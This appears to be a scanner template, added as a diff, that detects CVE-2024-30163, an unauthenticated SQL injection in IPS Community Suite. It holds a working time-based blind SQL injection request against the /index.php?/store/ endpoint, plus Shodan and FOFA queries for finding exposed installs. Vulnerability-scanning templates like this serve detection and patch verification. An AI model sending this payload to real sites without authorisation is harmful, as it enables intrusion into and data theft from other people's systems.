@@ -1,0 +1,46 @@
+id: CVE-2024-30163
+
+info:
+  name: "IPS Community Suite 未授权 SQL 注入漏洞"
+  author: ritikchaddha
+  severity: critical
+  description: |
+    IPS Community Suite is vulnerable to unauthenticated SQL injection via the filter[] parameter in the /index.php?/store/ endpoint, allowing attackers to extract sensitive information from the database.
+  remediation: |
+    Update to the latest version of IPS Community Suite.
+  reference:
+    - https://karmainsecurity.com/pocs/CVE-2024-30163.php
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-30163
+  classification:
+    cve-id: CVE-2024-30163
+    cwe-id: CWE-89
+    epss-score: 0.64641
+    epss-percentile: 0.98447
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    vendor: invision
+    product: ips_community_suite
+    max-request: 1
+    verified: true
+    shodan-query: html:"invision community"
+    fofa-query: body="invision community"
+  tags: IPS Community Suite
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        POST /index.php?/store/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        cat=1&filter[%60%20ON%201%20UNION%20SELECT%20IF(ORD(SUBSTR((1),1,1))%3C126,1,SLEEP(7))%20OR%20%3F%3D%3F%23]=1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=7"
+          - "contains(tolower(body), 'invision community')"
+        condition: and
+# digest: 490a00463044022070b0ab79284a83a0dcd2d0edec30d1438bcbe656d7939675d5f6ff4c9623c7b902207d516c2793d771f9c1ce10a2da6d576c39c483e8efe661ef09e019a0f4b7b7c8:922c64590222798bb761d5b6d8e72950
